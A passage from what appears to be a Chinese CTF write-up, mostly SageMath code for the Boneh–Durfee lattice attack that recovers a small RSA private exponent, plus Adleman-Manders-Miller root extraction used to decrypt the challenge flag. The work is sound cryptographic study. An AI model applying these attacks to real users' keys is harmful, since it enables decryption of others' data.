class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span></span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        print( <span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span>():</span></span><br><span class="line"></span><br><span class="line">    N = <span class="number">21669699875387343975765484834175962461348837371447024695458479154615348697330944566714587217852888702291368306637977095490953192701450127798670425959768118384915082017373951315699899009631834471691811815393784748930880954114446745814058132752897827717077886547911476575751254872623927783670252969995075629255541621917767501261249192653546875104532649043219697616464205772025267019328364349763854659490144531087349974469079255236823096415094552037488277752927579909539401311624671444833332618177513356173537573280352724384376372955100031534236816681805396608147647003653628203258681097552049114308367967967184116839561</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">20717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607</span></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.29</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line"><span class="comment">#         m = 4 # size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">        t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">        X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Problem put in equation</span></span><br><span class="line">        P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">        A = <span class="built_in">int</span>((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">        pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Find the solutions!</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Checking bounds</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># boneh_durfee</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">            start_time = time.time()</span><br><span class="line"></span><br><span class="line">        solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># found a solution?</span></span><br><span class="line">        <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">            d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;private key found:&quot;</span>, d)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;=== no solution was found ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            print(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure><p>跑出<code>d1 =36167461773898995192586226632578677184913220227461899855497899052924496298787 </code></p><p>解rsa , 有<code>p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</code></p><h2 id="根据上面的p-n-还有一些e有关的条件-求flag"><a href="#根据上面的p-n-还有一些e有关的条件-求flag" class="headerlink" title="根据上面的p, n 还有一些e有关的条件, 求flag"></a>根据上面的p, n 还有一些e有关的条件, 求flag</h2><p>通过p,n得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line">p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">e=</span><br></pre></td></tr></table></figure><p>这里有个e是未知的, 但是<code>assert (e &gt; (ord(&quot;*&quot;)*100) and gcd(e,(p-1)*(q-1))!=1 )</code><br>可以看到e&gt;4200而且e与phi不是互素的…</p><p>马上想到AMM了, 但是这个e不知道<br>试试从4200开始爆破e….结果AMM实在是跑的太久了(也不知道为啥<br>根本没办法往下爆…</p><p>想回去看看之前找到AMM的那个博客, 想自己重新写一个来着……<br><a href="http://yulige.top/?p=752#Sore667pt_6solvers">http://yulige.top/?p=752#Sore667pt_6solvers</a> - easyRSA<br>然后…就发现 怎么博客那道题的p和q和这道题的一模一样啊!<br>会不会e也没改?<br>于是试了一下原题的e = 0x1337, 然后把<del>慢到打把游戏都跑不完的</del>组合ART改成直接遍历mod p下的0x1337次方根(只有flag够短才能成功, 事实上做出答案了发现出题人是有做padding的, 但是似乎还是太短了?</p><p>然后就直接跑出来了….</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AMM</span>(<span class="params">o, r, q</span>):</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    print(<span class="string">&#x27;\n----------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    print(<span class="string">&#x27;[+] Find p:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    print(<span class="string">&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, t))</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    print(<span class="string">&#x27;[+] Find alp:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(alp))</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[+] Calculating DLP...&#x27;</span>)</span><br><span class="line">            j = - dicreat_log(a, d)</span><br><span class="line">            print(<span class="string">&#x27;[+] Finish DLP...&#x27;</span>)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c ^ r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    print(<span class="string">&#x27;Find one solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findAllPRoot</span>(<span class="params">p, e</span>):</span></span><br><span class="line">    print(<span class="string">&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(proot) &lt; e:</span><br><span class="line">        proot.add(<span class="built_in">pow</span>(random.randint(<span class="number">2</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findAllSolutions</span>(<span class="params">mp, proot, cp, p</span>):</span></span><br><span class="line">    print(<span class="string">&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, cp, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">pow</span>(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">c = <span 